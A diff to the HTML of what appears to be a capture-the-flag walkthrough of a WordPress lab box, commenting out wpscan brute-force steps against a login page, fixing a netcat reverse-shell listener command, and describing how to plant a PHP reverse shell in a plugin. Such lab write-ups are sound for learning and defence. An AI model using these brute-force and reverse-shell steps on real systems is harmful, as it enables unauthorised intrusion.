@@ -347,6 +347,7 @@
             </code></pre></div>
             <p></p>
             -->
+            <!--
             <p>This program makes a shorter wordlist called new.txt . But we need a another tool to start bruteforce attack on login page. This site is built with wordpress. So we can use the tool named wpscan if you dont have it you can install it with this commands:</p>
             <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>sudo apt-get update</code></pre></div>
             <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>sudo apt install ruby ruby-dev</code></pre></div>
@@ -355,6 +356,7 @@
             <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>sudo gem install wpscan</code></pre></div>
             <p>For to start bruteforce attack we can use this command:</p>
             <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>wpscan --url http://10.10.240.142/wp-login.php -U elliot -P /home/parrot/new.txt</code></pre></div>
+            -->
             <p>When attack finished we learn what is elliots password:</p>
         </div>
         <div class="photo-container">
@@ -364,7 +366,7 @@
         <div class="photo-container">
             <img src="pics/m7.png" alt="Image 7">
             <p>To get a reverse shell first we start a listener in our attacker box:</p>
-            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>nc-lvnp 1234</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>nc -lvnp 1234</code></pre></div>
             <p>After some search i found a way to get a reverse shell. First we activate All In One SEO Pack plugin after that we edit it. I used <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a> . But if we just paste this reverse shell into the plugin it says Invalid Header. So we change it like this:</p>
             <!--
             <div style="position: relative; background-color: #ffffff; padding: 10px; border-radius: 5px; overflow-x: auto;color: black;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code> 
